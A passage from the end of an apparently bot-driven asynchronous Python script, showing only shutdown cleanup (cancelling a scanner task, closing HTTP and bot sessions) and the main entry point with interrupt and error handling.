        except (KeyboardInterrupt, SystemExit):
            pass

    try:
        scanner_task.cancel()
    except Exception:
        pass
    if _HTTP_SESSION and not _HTTP_SESSION.closed:
        await _HTTP_SESSION.close()
    try:
        await bot.session.close()
    except Exception:
        pass

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        log.info("Interrupted by user")
    except Exception as e:
        log.critical(f"FATAL: {e}", exc_info=True)
        sys.exit(1)